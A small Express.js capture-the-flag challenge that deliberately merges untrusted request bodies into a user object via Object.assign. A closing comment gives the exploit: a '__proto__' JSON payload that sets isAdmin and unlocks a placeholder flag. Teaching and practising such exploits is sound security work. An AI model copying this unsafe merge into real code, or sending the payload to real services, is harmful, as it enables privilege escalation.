const express = require('express');
const bodyParser = require('body-parser');

const app = express();
app.use(bodyParser.json());

// Vulnerable object
let user = {
    username: "guest",
    role: "user"
};

// Prototype pollution vulnerability
app.post('/update', (req, res) => {
    Object.assign(user, req.body);
    res.json({ message: "User updated!" });
});

// Secret flag endpoint
app.get('/flag', (req, res) => {
    if (user.isAdmin) {
        res.send("flag{hide_it}");
    } else {
        res.send("Access Denied");
    }
});

app.listen(3000, () => console.log('Challenge running on http://localhost:3000'));

/* Exploit:
Fetch the flag by sending a POST request to /update with:
{
    "__proto__": { "isAdmin": true }
}
Then access /flag to retrieve flag{hide_it}.
*/
